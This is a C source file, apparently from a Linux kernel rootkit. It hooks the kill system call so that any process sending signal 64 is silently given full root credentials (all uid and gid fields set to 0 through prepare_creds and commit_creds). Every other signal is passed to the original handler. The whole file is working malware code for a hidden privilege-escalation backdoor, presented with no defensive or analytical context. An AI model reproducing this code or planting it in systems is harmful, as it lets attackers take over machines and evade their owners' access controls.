//
// Created by sciver on 10/17/22.
//

#include "setroot.h"
void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}
asmlinkage long (*orig_kill_setroot)(const struct pt_regs *);
asmlinkage int hook_kill_setroot(const struct pt_regs *regs)
{
    void set_root(void);

    int sig = regs->si;

    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill_setroot(regs);
}
